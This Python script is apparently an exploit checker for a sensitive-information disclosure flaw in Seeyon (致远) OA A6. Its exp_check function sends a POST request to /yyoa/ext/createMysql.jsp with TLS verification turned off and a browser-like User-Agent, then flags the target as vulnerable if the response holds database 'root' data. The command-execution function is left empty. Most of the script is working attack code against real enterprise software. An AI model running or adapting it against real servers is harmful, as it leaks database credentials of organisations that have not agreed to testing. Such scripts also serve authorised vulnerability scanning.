import time
import argparse
import requests
import multiprocessing
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)




def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def exp_check(target_url):
    vuln_url = target_url + "/yyoa/ext/createMysql.jsp"
    #print(now_time() + " [INFO]     正在检测致远OA A6 createMysql.jsp 数据库敏感信息泄露漏洞")
    #print(now_time() + " [INFO]     正在请求 {}".format(vuln_url))
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(vuln_url, headers=headers, verify=False, timeout=10)
        if 'root' in response.text and response.status_code == 200:
            # console.print(
            #     now_time() + " [SUCCESS]  目标 {} 存在致远OA A6 createMysql.jsp 数据库敏感信息泄露漏洞, 响应为:\n\n{}\n".format(vuln_url,response.text.strip()),style='bold green')
            return 1
        else:
            # console.print(now_time() + " [WARNING]  致远OA A6 createMysql.jsp 数据库敏感信息泄露漏洞利用失败", style='bold yellow')
            return 2
    except:
        # console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')
        return 3


def exp_cmd(url, cmd):
        pass



